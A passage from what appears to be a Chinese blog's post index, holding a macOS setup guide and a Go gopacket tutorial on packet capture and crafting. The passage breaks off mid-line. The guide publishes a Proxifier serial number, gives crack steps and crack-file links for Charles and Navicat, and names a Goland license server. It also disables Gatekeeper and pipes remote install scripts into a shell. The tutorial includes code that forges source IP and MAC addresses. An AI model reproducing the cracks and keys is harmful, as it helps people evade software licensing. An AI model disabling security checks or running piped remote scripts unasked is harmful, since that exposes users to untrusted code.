在全屏幕显示的应用之间轻扫 => 将 `用三个手指左右轻扫` 改成 `用四个手指左右轻扫`\n3. 系统偏好设置 => 辅助功能 => 鼠标与触控板 => 触控板选项 => 勾上 `启用拖移` 并将后面选项选择 `三指拖移`\n\n## 修改键盘操作到最佳备战状态\n\n系统偏好设置 => 键盘 => 键盘选项卡 =>  按照如下操作\n\n1. 勾选 闲置5秒后关闭键盘背光灯(可选)\n2. 勾选 在菜单栏中显示虚拟键盘及表情检视器 (可选)\n3. 勾选 将F1、F2等键作为标准功能键\n\n### 修改Macbook电脑名称\n\n1. 系统偏好设置 => 共享 => 电脑名称 => 输入你的电脑名称 => 回车\n\n### 修改MacBook插上电源时不休眠\n\n系统偏好设置 => 节能 => 去掉 `当显示器关闭时,防止电脑自动进入休眠` 的勾勾\n\n### 电池显示电量百分比\n\n右上角电池图标🔋 => 点击 => 显示百分比\n\n### 时间设置为24小时制\n\n系统偏好设置 => 时间与日期 => 时间 => 勾选 `在时间中显示秒钟`和`使用24小时格式时钟`和`显示日期`\n\n### 设置蓝牙图标在顶部状态栏显示\n\n系统偏好设置 => 蓝牙 => 勾上 在菜单栏显示蓝牙\n\n### 设置 允许任何应用安装\n\n系统偏好设置 => 通用 => 允许从以下位置下载的应用\n\n可以看到  没有勾选上 `任何来源` 甚至没有这个选项，执行 `sudo spctl --master-disable ` 即可。\n\n### 禁用 Spotlight\n\n禁用方法：\n\n```bash\nsudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.metadata.mds.plist\n# 去掉状态栏图标\ncd /System/Library/CoreServices/\nsudo mv Search.bundle/ Search.bundle.bak/\n```\n\n恢复方法：\n\n```bash\nsudo launchctl load -w /System/Library/LaunchDaemons/com.apple.metadata.mds.plist\n# 状态栏图标\ncd /System/Library/CoreServices/\nsudo mv Search.bundle.bak/ Search.bundle/\n```\n\n设置后需要重启。\n\n> 当你发现 系统有大量mds、mds_stores、mdworker进程在后台疯狂工作的问题 ，CPU近乎占满的时候，来看看这里，原因是这几个进程为了Spotlight索引在疯狂的工作，禁用即可。\n>\n> 禁用方法：\n>\n> ```\n> sudo mdutil -a -i off\n> ```\n>\n> 启用方法：\n> ```\n> sudo mdutil -a -i on\n> ```\n\n\n\n### 显示隐藏文件\n\n```bash\n# 显示\ndefaults write com.apple.finder AppleShowAllFiles YES\n# 重启Finder\nkillall Finder\n```\n\n隐藏只需将 `YES` 改成 `No` 执行即可。\n\n### 禁用Dashboard功能\n\n```bash\ndefaults write com.apple.dashboard mcx-disabled -boolean YES\nkillall Dock\n```\n\n恢复开启状态只需将 `YES` 改成 `NO` 执行即可。\n\n### 设置电脑名称\n\n>  注意：执行时需要管理员密码\n\n```bash\nscutil --set ComputerName \"lfoder MacBook Pro\"\nscutil --set LocalHostName \"lfoder-MacBook-Pro\"\nscutil --set HostName \"lfoder\"\n```\n\n查看只需要将 `--set` 换成 `--get` 执行即可。\n\n三个名称的区别：\n\n- **Computer Name**：共享设置里的电脑名称，可以使用汉字等特殊字符；\n- **Local Host Name**：Computer Name的别名，把特殊字符转换为ASCII字符，比如汉字转为拼音，空格转为`-`，同样在共享设置里可以看到；\n- **Host Name**: 这个会显示在终端里。\n\n在局域网里可以通过 **Local Host Name** 加上 `.local` 来访问 Mac 电脑\n\n```\ncurl lfoder-MacBook-Pro.local\nping lfoder-MacBook-Pro.local\n```\n\n也可以通过设置 WINS 里的 NetBIOS 名称来访问。\n\n ### 设置英文输入法下长按为连续输入\n\n```bash\nsudo defaults write -globalDomain ApplePressAndHoldEnabled -bool NO\n```\n\n 恢复将 `NO` 改成 `YES` 执行即可。\n\n\n\n## 应用程序配置\n\n### 安装与配置搜狗输入法\n\n1. 访问 http://pinyin.sogou.com 下载安装\n2. 安装向导按照你自己的喜好配置完毕。\n3. 系统偏好设置 => 键盘 => 输入法 => 选择你不用的输入法 点击下面的减号 都删掉 => 最后就留下了 `搜狗拼音`和`ABC`\n\n### 安装 Typora\n\nTypora是一款非常棒的MarkDown编辑器，我现在安装了Typora来使用MarkDown语法写这篇博文。\n\n安装请到官网根据自己的系统来下载对应版本\n\n官网：https://www.typora.io\n\n安装好以后开始配置,  ` Command + , ` 打开偏好配置，也可以左上角菜单栏去找到偏好设置。\n\n具体设置如下：\n\n偏好设置 => 通用 => 选择 `Seamless` 窗口样式 => 勾选总是显示字数统计\n\n偏好设置 => 编辑器 => 勾选 匹配MarkDown字符\n\n偏好设置 => 编辑器 => 勾选 显示当前块元素的Markdown源码\n\n### 安装 Java 1.8 JDK\n\n下载地址: \n\nhttp://download.oracle.com/otn-pub/java/jdk/8u171-b11/512cd62ec5174c3487ac17c61aaa89e8/jdk-8u171-macosx-x64.dmg\n\n### 安装 ICEWorks\n\n一个便捷的拖拽式前端开发工具\n\n官方网站 => [https://alibaba.github.io/ice](https://alibaba.github.io/ice/)\n\n### 安装Navicat Premium 12 破解版\n\n下载地址：[http://www.navicat.com.cn/installers/navicat120_premium_cs.dmg](http://www.navicat.com.cn/installers/navicat120_premium_cs.dmg)\n\n破解方法：\n\n1. [https://blog.csdn.net/u013490280/article/details/79720893](https://blog.csdn.net/u013490280/article/details/79720893)\n2. [https://www.jianshu.com/p/f42785e55b6b](https://www.jianshu.com/p/f42785e55b6b)\n\n### 安装 Proxifier\n\n下载地址：自行百度\n\n注册名：Anything\n\n序列号：P427L-9Y552-5433E-8DSR3-58Z68\n\n\n\n### 安装 Charles 抓包工具\n\n官方下载：\n\nhttps://www.charlesproxy.com/assets/release/4.2.5/charles-proxy-4.2.5.dmg\n\n破解说明：\n\nhttps://www.52pojie.cn/thread-725112-1-1.html\n\n破解文件链接: \n\nhttps://pan.baidu.com/s/1wl2m9a2hhJwTUJ7sCiKyVg  \n\n密码: znpg\n\n破解步骤：\n\n```\n1. 从官方下载mac版本\n2. 首先安装完毕，需要点击运行一起，command + q 彻底退出一次\n3. 在命令行终端输入 sudo spctl --master-disable 信任任何来源 （避免软件提示破损问题）\n4. 在命令行终端输入 open /Applications/Charles.app/Contents/Java/ 打开并替换 charles.jar（最好备份一下源文件, 我修改源文件名charles.jar.bak）\n5. 替换完成后，在此打开charles应用，加载期间你会发现注册成功\n6. 在命令行终端输入 sudo spctl --master-enable 调整信任App store和被认可的开发者.\n```\n\n\n\n### 其他第三方程序列表\n\n这些程序自己百度搜索下载安装，列表为我自己常用的程序，具体程序使用作用自己搜索资料了解，因人而异，只做参考，排名不分先后。\n\n- [x] Anylink \t——  Shadowsocks连接工具 (并非最好)\n- [x] CleanApp —— 卸载程序专用的工具，能清理垃圾\n- [x] Dr. Unarchiver —— 解压缩工具 (目前使用过最好用)\n- [x] iPic —— MarkDown图片上传图床插件\n- [x] Thunder —— 迅雷\n- [x] Proxifier —— 系统全局代理工具\n- [x] Goland —— Golang编程开发工具 (License Server 如下)\n  - http://idea.youbbs.org\n- [x] VSCode —— 通用编辑器 类似Windows上的Nodepad++\n- [x] Microsoft Office 2016 \n- [x] Nessus  \n  - 记得更新插件包\n  - 激活码获取途径：https://www.tenable.com/products/nessus-home 注册后会向邮箱发送激活码\n- [x] iStat Meuns —— 状态栏工具 \n- [x] Chrome\n- [x] Teamviewer\n\n## 命令行工具安装与配置\n\n### Homebrew (MacOS下的包管理器，类似于CentOS的yum、Debian的apt)\n\n官方网站：https://brew.sh/index_zh-cn\n\n安装 (这里命令其实只有一行，可能会自动换行):\n\n```\n/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\" \n```\n\n一路回车下去，然后会遇到一个类似下面的东西\n\n```\n==> Downloading and installing Homebrew...\n\nremote: Counting objects: 102994, done.\nremote: Compressing objects: 100% (14/14), done.\nReceiving objects:  12% (12360/102994), 3.11 MiB | 60.00 KiB/s     \n\n```\n\n速度非常慢，漫长的等待吧.... \n\n安装完成后 ，更新与升级 \n\n```\nbrew update -y && brew upgrade -y\n```\n\n然后brew具体怎么安装程序，怎么卸载程序等等的使用方法，就自行百度或者看[官网文档](https://docs.brew.sh/)吧...\n\n> 这里还有一篇关于 brew 安装包速度太慢的解决方案：https://www.jianshu.com/p/03d1db713f76\n\n### oh-my-zsh 终端便捷操作工具\n\n首先看看 oh-my-zsh 的官网 ：http://ohmyz.sh/\n\n安装命令如下:\n\n```\nsh -c \"$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\"\n```\n\n### 安装 metasploit、tmux、nmap、masscan\n\n```\nbrew install metasploit tmux masscan wine\n```\n\n\n\n### Hexo安装与配置\n\n这里不做安装配置教程，只为系统重装之前的博客目录服务进行恢复，读者感兴趣可百度Hexo的安装和配置，不感兴趣自行跳过，纯属个人笔记。更多关于Hexo的配置详情，请在本博客导航栏 `搜索` 功能中搜索关键字 `Hexo` \n\n安装nodejs环境：\n\n```\nbrew install nodejs\n```\n\n调整npm源到淘宝源：\n\n```\nnpm config set registry \"https://registry.npm.taobao.org\"\n```\n\n安装hexo：\n\n```\nnpm install hexo -g\n```\n\n安装插件：\n\n```\nnpm install hexo-server --save\nnpm install hexo-deployer-git --save\n```\n\n嗯 ，可以用了\n\n... \n\n...\n\n...\n\n欲了解详情自行Google。\n\n切换到博客路径并安装插件 (网上摘录，可选)\n\n```\n# 切换到该路径\ncd 你的博客文件夹\n# 安装hexo的扩展插件\nnpm install\n# 安装其它插件\nnpm install hexo-server --save\nnpm install hexo-admin --save\nnpm install hexo-generator-archive --save\nnpm install hexo-generator-feed --save\nnpm install hexo-generator-search --save\nnpm install hexo-generator-tag --save\nnpm install hexo-deployer-git --save\nnpm install hexo-generator-sitemap --save\n```\n\n\n\n设置 git 全局配置:\n\n```\ngit config --global user.name \"你的GitHub用户名\"\ngit config --global user.email \"你的GitHub注册邮箱\"\n```\n\n生成SSH密钥，一路回车下去。\n\n```\nssh-keygen -t rsa\n```\n\n添加公钥到github: \n\n登录Github => 用户头像 => Settings => SSH and GPG keys => New SSH key => 将 `~/.ssh/id_rsa.pub` 中的内容复制到Key文本框中，然后点击Add SSH key(添加SSH)按钮。\n\n### MacPorts  (MacOS下的包管理器，类似于CentOS的yum、Debian的apt)\n\n官网下载链接: [https://www.macports.org/install.php](https://www.macports.org/install.php)\n\n**安装步骤：**\n\n1. 我是MacOS 10.12，按照上面的官网链接下载自己对应的版本。\n\n2. 添加环境变量\n\n   我使用的是 `zsh` ,那么修改环境变量 则编辑 `~/.zshrc` ,你也可以选择编辑 `/etc/profile`\n\n   ```\n   export PATH=/opt/local/bin:$PATH\n   export PATH=/opt/local/sbin:$PATH\n   ```\n\n   添加这两行到你的环境变量 (我修改的是`~/.zshrc`)\n\n   然后即可生效\n\n   ```bash\n   source ~/.zshrc\n   ```\n\n   OK !!!\n\n**使用过程：**\n\n- 更新ports tree和MacPorts版本，强烈推荐第一次运行的时候使用-v参数，显示详细的更新过程。\n\n  ```bash\n  sudo port -v selfupdate\n  ```\n\n- 搜索索引中的软件\n\n  ```\n  port search <appname>\n  ```\n\n- 安装软件 \n\n  ```\n  sudo port install <appname>\n  ```\n\n- 卸载软件\n\n  ```bash\n  sudo port uninstall <appname>\n  ```\n\n- 查看有更新的软件以及版本\n\n  ```bash\n  port outdated\n  ```\n\n- 升级可以更新的软件\n\n  ```bash\n  sudo port upgrade outdated\n  ```\n\n- 列出所有可用软件\n\n  ```bash\n  port list\n  ```\n\n- 查看软件包详细信息\n\n  ```bash\n  port info <appname>\n  ```\n\n- 查看软件包依赖\n\n  ```bash\n  port deps <appname>\n  ```\n\n- 删除软件包安装过程中释放的零碎文件\n\n  ```bash\n  port clean --all <appname>\n  ```\n\n- 查看需要此依赖包的所有软件\n\n  ```bash\n  port dependents <依赖包名>\n  ```\n\n  \n\n\n\n**举个例子：**\n\nEclipse的插件需要subclipse需要JavaHL，下面通过MacPorts来安装\n\n```bash\nsudo port install subversion-javahlbindings\n```\n\n\n\n\n\n> 未完待续...","tags":["MacOS系统优化"],"categories":["MacOS 笔记"]},{"title":"Golang调用gopacket库编写网络数据包捕获、注入、分析工具","url":"%2F2018%2F06%2F17%2FGolang%E8%B0%83%E7%94%A8gopacket%E5%BA%93%E7%BC%96%E5%86%99%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8D%95%E8%8E%B7%E3%80%81%E6%B3%A8%E5%85%A5%E3%80%81%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%2F","content":"\nGolang调用gopacket库编写网络数据包捕获、注入、分析工具，使用Google推出的  `github.com/google/gopacket` 包来实现对网络数据包的操作，gopacket基于libpcap。\n\n### 1. libpcap 介绍\n\ngopacket是基于libpcap（数据包捕获函数库）的，该库提供的C函数接口用于捕捉经过指定网络接口的数据包，该接口应该是被设为混杂模式。 \n著名的软件TCPDUMP就是在Libpcap的基础上开发而成的。Libpcap提供的接口函数实现和封装了与数据包截获有关的过程。Libpcap可以在绝大多数Linux平台上运行。 \n\n主要有以下功能： \n- 数据包捕获：捕获流经网卡的原始数据包 \n- 自定义数据包发送：构造任何格式的原始数据包 \n- 流量采集与统计：采集网络中的流量信息 \n- 规则过滤：提供自带规则过滤功能，按需要选择过滤规则\n\n### 2. 准备工作\n\n```go\n# Get the gopacket package from GitHub\ngo get github.com/google/gopacket\n# Pcap dev headers might be necessary\nsudo apt-get install libpcap-dev\n```\n\n从Github上获取 `Gopacket` 包\n\n```\ngo get -u -v github.com/google/gopacket\n```\n\n在你的系统上安装 `libpcap-dev` 包\n\n- MacOS (默认已经安装)\n\n  ```\n  brew install libpcap\n  ```\n\n- Ubuntu\n\n  ```\n  apt-get install libpcap-dev\n  ```\n\n- CentOS\n\n  ```\n  yum install libpcap-dev\n  ```\n\n### 3. 代码部分\n\n#### 获取所有网络设备\n\n```go\npackage main\n\nimport (\n    \"fmt\"\n    \"log\"\n    \"github.com/google/gopacket/pcap\"\n)\n\nfunc main() {\n    // Find all devices\n    devices, err := pcap.FindAllDevs()\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    // Print device information\n    fmt.Println(\"Devices found:\")\n    for _, device := range devices {\n        fmt.Println(\"\\nName: \", device.Name)\n        fmt.Println(\"Description: \", device.Description)\n        fmt.Println(\"Devices addresses: \", device.Description)\n        for _, address := range device.Addresses {\n            fmt.Println(\"- IP address: \", address.IP)\n            fmt.Println(\"- Subnet mask: \", address.Netmask)\n        }\n    }\n}\n```\n\n#### 打开设备实时捕捉\n\n```go\npackage main\n\nimport (\n    \"fmt\"\n    \"github.com/google/gopacket\"\n    \"github.com/google/gopacket/pcap\"\n    \"log\"\n    \"time\"\n)\n\nvar (\n    device       string = \"eth0\"\n    snapshot_len int32  = 1024\n    promiscuous  bool   = false\n    err          error\n    timeout      time.Duration = 30 * time.Second\n    handle       *pcap.Handle\n)\n\nfunc main() {\n    // Open device\n    handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)\n    if err != nil {log.Fatal(err) }\n    defer handle.Close()\n\n    // Use the handle as a packet source to process all packets\n    packetSource := gopacket.NewPacketSource(handle, handle.LinkType())\n    for packet := range packetSource.Packets() {\n        // Process packet here\n        fmt.Println(packet)\n    }\n}\n```\n\n#### 抓取结果保存为pcap格式文件\n\n> 要写一个pcap格式的文件，我们必须使用gapacket / pcapgo包。这是一个Writer接口和两个有用的函数：WriteFileHeader（）和WritePacket（）\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"time\"\n\n\t\"github.com/google/gopacket\"\n\t\"github.com/google/gopacket/layers\"\n\t\"github.com/google/gopacket/pcap\"\n\t\"github.com/google/gopacket/pcapgo\"\n)\n\nvar (\n\tdeviceName  string = \"eth0\"\n\tsnapshotLen int32  = 1024\n\tpromiscuous bool   = false\n\terr         error\n\ttimeout     time.Duration = -1 * time.Second\n\thandle      *pcap.Handle\n\tpacketCount int = 0\n)\n\nfunc main() {\n\t// Open output pcap file and write header \n\tf, _ := os.Create(\"test.pcap\")\n\tw := pcapgo.NewWriter(f)\n\tw.WriteFileHeader(snapshotLen, layers.LinkTypeEthernet)\n\tdefer f.Close()\n\n\t// Open the device for capturing\n\thandle, err = pcap.OpenLive(deviceName, snapshotLen, promiscuous, timeout)\n\tif err != nil {\n\t\tfmt.Printf(\"Error opening device %s: %v\", deviceName, err)\n\t\tos.Exit(1)\n\t}\n\tdefer handle.Close()\n\n\t// Start processing packets\n\tpacketSource := gopacket.NewPacketSource(handle, handle.LinkType())\n\tfor packet := range packetSource.Packets() {\n\t\t// Process packet here\n\t\tfmt.Println(packet)\n\t\tw.WritePacket(packet.Metadata().CaptureInfo, packet.Data())\n\t\tpacketCount++\n\t\t\n\t\t// Only capture 100 and then stop\n\t\tif packetCount > 100 {\n\t\t\tbreak\n\t\t}\n\t}\n}\n```\n\n#### 读取pcap格式文件来查看分析网络数据包\n\n> 我们不用打开一个设备进行实时捕获，也可以打开pcap文件进行离线检查。您可以使用tcpdump创建要使用的测试文件。\n\n抓包：\n```bash\n# Capture packets to test.pcap file\nsudo tcpdump -w test.pcap\n```\n代码：\n```\npackage main\n\n// Use tcpdump to create a test file\n// tcpdump -w test.pcap\n// or use the example above for writing pcap files\n\nimport (\n    \"fmt\"\n    \"github.com/google/gopacket\"\n    \"github.com/google/gopacket/pcap\"\n    \"log\"\n)\n\nvar (\n    pcapFile string = \"test.pcap\"\n    handle   *pcap.Handle\n    err      error\n)\n\nfunc main() {\n    // Open file instead of device\n    handle, err = pcap.OpenOffline(pcapFile)\n    if err != nil { log.Fatal(err) }\n    defer handle.Close()\n\n    // Loop through packets in file\n    packetSource := gopacket.NewPacketSource(handle, handle.LinkType())\n    for packet := range packetSource.Packets() {\n        fmt.Println(packet)\n    }\n}\n```\n\n#### 设置过滤器\n\n> 只抓取tcp协议80端口的数据\n\n```go\npackage main\n\nimport (\n    \"fmt\"\n    \"github.com/google/gopacket\"\n    \"github.com/google/gopacket/pcap\"\n    \"log\"\n    \"time\"\n)\n\nvar (\n    device       string = \"eth0\"\n    snapshot_len int32  = 1024\n    promiscuous  bool   = false\n    err          error\n    timeout      time.Duration = 30 * time.Second\n    handle       *pcap.Handle\n)\n\nfunc main() {\n    // Open device\n    handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)\n    if err != nil {\n        log.Fatal(err)\n    }\n    defer handle.Close()\n\n    // Set filter\n    var filter string = \"tcp and port 80\"\n    err = handle.SetBPFFilter(filter)\n    if err != nil {\n        log.Fatal(err)\n    }\n    fmt.Println(\"Only capturing TCP port 80 packets.\")\n\n    packetSource := gopacket.NewPacketSource(handle, handle.LinkType())\n    for packet := range packetSource.Packets() {\n        // Do something with a packet here.\n        fmt.Println(packet)\n    }\n\n}\n```\n\n#### 解码抓取的数据\n\n> 我们可以使用原始数据包，并且可将其转换为已知格式。它与不同的层兼容，所以我们可以轻松访问以太网，IP和TCP层。layers包是Go库中新增的，在底层pcap库中不可用。这是一个令人难以置信的有用的包，它是gopacket库的一部分。它允许我们容易地识别包是否包含特定类型的层。该代码示例将显示如何使用layers包来查看数据包是以太网，IP和TCP，并轻松访问这些头文件中的元素。 查找有效载荷取决于所涉及的所有层。每个协议是不同的，必须相应地计算。这就是layer包的魅力所在。 gopacket的作者花了时间为诸如以太网，IP，UDP和TCP等众多已知层创建了相应类型。有效载荷是应用层的一部分。\n\n```go\npackage main\n\nimport (\n    \"fmt\"\n    \"github.com/google/gopacket\"\n    \"github.com/google/gopacket/layers\"\n    \"github.com/google/gopacket/pcap\"\n    \"log\"\n    \"strings\"\n    \"time\"\n)\n\nvar (\n    device      string = \"eth0\"\n    snapshotLen int32  = 1024\n    promiscuous bool   = false\n    err         error\n    timeout     time.Duration = 30 * time.Second\n    handle      *pcap.Handle\n)\n\nfunc main() {\n    // Open device\n    handle, err = pcap.OpenLive(device, snapshotLen, promiscuous, timeout)\n    if err != nil {log.Fatal(err) }\n    defer handle.Close()\n\n    packetSource := gopacket.NewPacketSource(handle, handle.LinkType())\n    for packet := range packetSource.Packets() {\n        printPacketInfo(packet)\n    }\n}\n\nfunc printPacketInfo(packet gopacket.Packet) {\n    // Let's see if the packet is an ethernet packet\n    ethernetLayer := packet.Layer(layers.LayerTypeEthernet)\n    if ethernetLayer != nil {\n        fmt.Println(\"Ethernet layer detected.\")\n        ethernetPacket, _ := ethernetLayer.(*layers.Ethernet)\n        fmt.Println(\"Source MAC: \", ethernetPacket.SrcMAC)\n        fmt.Println(\"Destination MAC: \", ethernetPacket.DstMAC)\n        // Ethernet type is typically IPv4 but could be ARP or other\n        fmt.Println(\"Ethernet type: \", ethernetPacket.EthernetType)\n        fmt.Println()\n    }\n\n    // Let's see if the packet is IP (even though the ether type told us)\n    ipLayer := packet.Layer(layers.LayerTypeIPv4)\n    if ipLayer != nil {\n        fmt.Println(\"IPv4 layer detected.\")\n        ip, _ := ipLayer.(*layers.IPv4)\n\n        // IP layer variables:\n        // Version (Either 4 or 6)\n        // IHL (IP Header Length in 32-bit words)\n        // TOS, Length, Id, Flags, FragOffset, TTL, Protocol (TCP?),\n        // Checksum, SrcIP, DstIP\n        fmt.Printf(\"From %s to %s\\n\", ip.SrcIP, ip.DstIP)\n        fmt.Println(\"Protocol: \", ip.Protocol)\n        fmt.Println()\n    }\n\n    // Let's see if the packet is TCP\n    tcpLayer := packet.Layer(layers.LayerTypeTCP)\n    if tcpLayer != nil {\n        fmt.Println(\"TCP layer detected.\")\n        tcp, _ := tcpLayer.(*layers.TCP)\n\n        // TCP layer variables:\n        // SrcPort, DstPort, Seq, Ack, DataOffset, Window, Checksum, Urgent\n        // Bool flags: FIN, SYN, RST, PSH, ACK, URG, ECE, CWR, NS\n        fmt.Printf(\"From port %d to %d\\n\", tcp.SrcPort, tcp.DstPort)\n        fmt.Println(\"Sequence number: \", tcp.Seq)\n        fmt.Println()\n    }\n\n    // Iterate over all layers, printing out each layer type\n    fmt.Println(\"All packet layers:\")\n    for _, layer := range packet.Layers() {\n        fmt.Println(\"- \", layer.LayerType())\n    }\n\n    // When iterating through packet.Layers() above,\n    // if it lists Payload layer then that is the same as\n    // this applicationLayer. applicationLayer contains the payload\n    applicationLayer := packet.ApplicationLayer()\n    if applicationLayer != nil {\n        fmt.Println(\"Application layer/Payload found.\")\n        fmt.Printf(\"%s\\n\", applicationLayer.Payload())\n\n        // Search for a string inside the payload\n        if strings.Contains(string(applicationLayer.Payload()), \"HTTP\") {\n            fmt.Println(\"HTTP found!\")\n        }\n    }\n\n    // Check for errors\n    if err := packet.ErrorLayer(); err != nil {\n        fmt.Println(\"Error decoding some part of the packet:\", err)\n    }\n}\n```\n\n#### 构造发送数据包\n\n>这个例子做了几件事情。首先将显示如何使用网络设备发送原始字节。这样就可以像串行连接一样使用它来发送数据。这对于真正的低层数据传输非常有用，但如果您想与应用程序进行交互，您应该构建可以识别该数据包的其他硬件和软件。接下来，它将显示如何使用以太网，IP和TCP层创建一个数据包。一切都是默认空的。要完成它，我们创建另一个数据包，但实际上填写了以太网层的一些MAC地址，IPv4的一些IP地址和TCP层的端口号。你应该看到如何伪装数据包和仿冒网络设备。TCP层结构体具有可读取和可设置的SYN，FIN，ACK标志。这有助于操纵和模糊TCP三次握手，会话和端口扫描。pcap库提供了一种发送字节的简单方法，但gopacket中的图层可帮助我们为多层创建字节结构。\n\n```go\npackage main\n\nimport (\n    \"github.com/google/gopacket\"\n    \"github.com/google/gopacket/layers\"\n    \"github.com/google/gopacket/pcap\"\n    \"log\"\n    \"net\"\n    \"time\"\n)\n\nvar (\n    device       string = \"eth0\"\n    snapshot_len int32  = 1024\n    promiscuous  bool   = false\n    err          error\n    timeout      time.Duration = 30 * time.Second\n    handle       *pcap.Handle\n    buffer       gopacket.SerializeBuffer\n    options      gopacket.SerializeOptions\n)\n\nfunc main() {\n    // Open device\n    handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)\n    if err != nil {log.Fatal(err) }\n    defer handle.Close()\n\n    // Send raw bytes over wire\n    rawBytes := []byte{10, 20, 30}\n    err = handle.WritePacketData(rawBytes)\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    // Create a properly formed packet, just with\n    // empty details. Should fill out MAC addresses,\n    // IP addresses, etc.\n    buffer = gopacket.NewSerializeBuffer()\n    gopacket.SerializeLayers(buffer, options,\n        &layers.Ethernet{},\n        &layers.IPv4{},\n        &layers.TCP{},\n        gopacket.Payload(rawBytes),\n    )\n    outgoingPacket := buffer.Bytes()\n    // Send our packet\n    err = handle.WritePacketData(outgoingPacket)\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    // This time lets fill out some information\n    ipLayer := &layers.IPv4{\n        SrcIP: net.IP{127, 0, 0, 1},\n        DstIP: net.IP{8, 8, 8, 8},\n    }\n    ethernetLayer := &layers.Ethernet{\n        SrcMAC: net.HardwareAddr{0xFF, 0xAA, 0xFA, 0xAA, 0xFF, 0xAA},\n        DstMAC: net.HardwareAddr{0xBD, 0xBD, 0xBD, 0xBD, 0xBD, 0xBD},\n    }\n    tcpLayer := &layers.TCP{\n        SrcPort: layers.TCPPort(4321),\n        DstPort: layers.TCPPort(80),\n    }\n    // And create the packet with the layers\n    buffer = gopacket.NewSerializeBuffer()\n    gopacket.SerializeLayers(buffer, options,\n        ethernetLayer,\n        ipLayer,\n        tcpLayer,\n        gopacket.Payload(rawBytes),\n    )\n    outgoingPacket = buffer.Bytes()\n}\n```\n\n#### 更多的解码/构造数据包的例子\n\n```go\npackage main\n\nimport (\n    \"fmt\"\n    \"github.com/google/gopacket\"\n    \"github.com/google/gopacket/layers\"\n)\n\nfunc main() {\n    // If we don't have a handle to a device or a file, but we have a bunch\n    // of raw bytes, we can try to decode them in to packet information\n\n    // NewPacket() takes the raw bytes that make up the packet as the first parameter\n    // The second parameter is the lowest level layer you want to decode. It will\n    // decode that layer and all layers on top of it. The third layer\n    // is the type of decoding: default(all at once), lazy(on demand), and NoCopy\n    // which will not create a copy of the buffer\n\n    // Create an packet with ethernet, IP, TCP, and payload layers\n    // We are creating one we know will be decoded properly but\n    // your byte source could be anything. If any of the packets\n    // come back as nil, that means it could not decode it in to\n    // the proper layer (malformed or incorrect packet type)\n    payload := []byte{2, 4, 6}\n    options := gopacket.SerializeOptions{}\n    buffer := gopacket.NewSerializeBuffer()\n    gopacket.SerializeLayers(buffer, options,\n        &layers.Ethernet{},\n        &layers.IPv4{},\n        &layers.TCP{},\n        gopacket.Payload(payload),\n    )\n    rawBytes := buffer.Bytes()\n\n    // Decode an ethernet packet\n    ethPacket :=\n        gopacket.NewPacket(\n            rawBytes,\n            layers.LayerTypeEthernet,\n            gopacket.Default,\n        )\n\n    // with Lazy decoding it will only decode what it needs when it needs it\n    // This is not concurrency safe. If using concurrency, use default\n    ipPacket :=\n        gopacket.NewPacket(\n            rawBytes,\n            layers.LayerTypeIPv4,\n            gopacket.Lazy,\n        )\n\n    // With the NoCopy option, the underlying slices are referenced\n    // directly and not copied. If the underlying bytes change so will\n    // the packet\n    tcpPacket :=\n        gopacket.NewPacket(\n            rawBytes,\n            layers.LayerTypeTCP,\n            gopacket.NoCopy,\n        )\n\n    fmt.Println(ethPacket)\n    fmt.Println(ipPacket)\n    fmt.Println(tcpPacket)\n}\n```\n\n#### 自定义layer\n\n> 下一个程序将显示如何创建自己的layer。构建gopacket layer包不包含的协议。如果您要创建自己的l33t协议，甚至不使用TCP / IP或以太网，这是很有用的。\n\n```go\npackage main\n\nimport (\n    \"fmt\"\n    \"github.com/google/gopacket\"\n)\n\n// Create custom layer structure\ntype CustomLayer struct {\n    // This layer just has two bytes at the front\n    SomeByte    byte\n    AnotherByte byte\n    restOfData  []byte\n}\n\n// Register the layer type so we can use it\n// The first argument is an ID. Use negative\n// or 2000+ for custom layers. It must be unique\nvar CustomLayerType = gopacket.RegisterLayerType(\n    2001,\n    gopacket.LayerTypeMetadata{\n        \"CustomLayerType\",\n        gopacket.DecodeFunc(decodeCustomLayer),\n    },\n)\n\n// When we inquire about the type, what type of layer should\n// we say it is? We want it to return our custom layer type\nfunc (l CustomLayer) LayerType() gopacket.LayerType {\n    return CustomLayerType\n}\n\n// LayerContents returns the information that our layer\n// provides. In this case it is a header layer so\n// we return the header information\nfunc (l CustomLayer) LayerContents() []byte {\n    return []byte{l.SomeByte, l.AnotherByte}\n}\n\n// LayerPayload returns the subsequent layer built\n// on top of our layer or raw payload\nfunc (l CustomLayer) LayerPayload() []byte {\n    return l.restOfData\n}\n\n// Custom decode function. We can name it whatever we want\n// but it should have the same arguments and return value\n// When the layer is registered we tell it to use this decode function\nfunc decodeCustomLayer(data []byte, p gopacket.PacketBuilder) error {\n    // AddLayer appends to the list of layers that the packet has\n    p.AddLayer(&CustomLayer{data[0], data[1], data[2:]})\n\n    // The return value tells the packet what layer to expect\n    // with the rest of the data. It could be another header layer,\n    // nothing, or a payload layer.\n\n    // nil means this is the last layer. No more decoding\n    // return nil\n\n    // Returning another layer type tells it to decode\n    // the next layer with that layer's decoder function\n    // return p.NextDecoder(layers.LayerTypeEthernet)\n\n    // Returning payload type means the rest of the data\n    // is raw payload. It will set the application layer\n    // contents with the payload\n    return p.NextDecoder(gopacket.LayerTypePayload)\n}\n\nfunc main() {\n    // If you create your own encoding and decoding you can essentially\n    // create your own protocol or implement a protocol that is not\n    // already defined in the layers package. In our example we are just\n    // wrapping a normal ethernet packet with our own layer.\n    // Creating your own protocol is good if you want to create\n    // some obfuscated binary data type that was difficult for others\n    // to decode\n\n    // Finally, decode your packets:\n    rawBytes := []byte{0xF0, 0x0F, 65, 65, 66, 67, 68}\n    packet := gopacket.NewPacket(\n        rawBytes,\n        CustomLayerType,\n        gopacket.Default,\n    )\n    fmt.Println(\"Created packet out of raw bytes.\")\n    fmt.Println(packet)\n\n    // Decode the packet as our custom layer\n    customLayer := 